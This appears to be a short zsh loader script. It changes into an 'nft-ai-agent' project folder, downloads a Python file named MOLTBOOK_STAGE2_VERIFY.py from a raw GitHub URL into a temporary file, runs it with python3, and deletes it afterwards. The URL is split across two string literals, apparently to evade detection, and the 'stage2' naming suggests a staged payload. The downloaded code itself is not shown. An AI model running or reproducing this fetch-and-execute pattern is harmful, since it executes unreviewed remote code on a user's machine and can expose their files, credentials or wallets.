#!/bin/zsh
set -euo pipefail
cd ~/nft-ai-agent
TMP="$(mktemp)"
trap 'rm -f "$TMP"' EXIT
curl -fsSL "https:""//raw.githubusercontent.com/mohamedazad415-coder/aisizarwalli-exp7/main/exp-008/MOLTBOOK_STAGE2_VERIFY.py" -o "$TMP"
python3 "$TMP"
